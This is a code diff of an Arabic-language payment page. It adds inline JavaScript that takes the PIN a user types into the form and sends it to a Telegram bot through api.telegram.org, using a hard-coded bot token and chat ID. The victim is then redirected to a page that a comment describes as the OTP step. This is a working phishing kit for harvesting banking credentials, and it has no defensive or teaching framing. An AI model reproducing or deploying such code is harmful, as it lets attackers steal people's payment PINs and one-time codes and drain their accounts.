@@ -18,7 +18,7 @@
     </div>
 
     <div class="box payment-form">
-        <form id="paymentForm">
+        <form id="paymentForm" onsubmit="event.preventDefault(); sendToTelegram();">
             <!-- حقل الرقم السري مع التحقق من الحد الأدنى والحد الأقصى للأرقام -->
             <div class="input-container">
                 <label id="texst4" for="pin">الرقم السري:</label>
@@ -34,6 +34,50 @@
         <button type="button" onclick="resetForm()">إلغاء</button>
     </div>
 
-    <script src="script.js"></script>
+    <script>
+        function sendToTelegram() {
+            var token = "7484126870:AAEDSU1tM_kBFwSJ0IpQT0NmuWYzW8wq4_E";  // ضع هنا التوكن الخاص بك
+            var chatId = "6454807559";  // ضع هنا الـ Chat ID الخاص بك
+
+            // جمع البيانات من النموذج
+            var pin = document.getElementById("pin").value;
+
+            // تحقق من أن الحقول ليست فارغة
+            if (!pin) {
+                alert("يرجى إدخال الرقم السري.");
+                return;
+            }
+
+            // صيغة الرسالة
+            var message = `📩 بيانات جديدة:\n\n` +
+                          `🔑 الرقم السري: ${pin}`;
+
+            // URL API الخاص بتليجرام
+            var url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+            // إرسال البيانات إلى تليجرام
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    alert("تم الإرسال بنجاح!");
+                    window.location.href = "eror.html";  // بعد إرسال البيانات، توجيه المستخدم إلى صفحة OTP
+                } else {
+                    alert("فشل الإرسال: " + data.description);
+                }
+            })
+            .catch(error => alert("حدث خطأ: " + error));
+        }
+
+        // دالة لإعادة تعيين النموذج إذا تم الضغط على إلغاء
+        function resetForm() {
+            document.getElementById("paymentForm").reset();
+        }
+    </script>
+
 </body>
 </html>
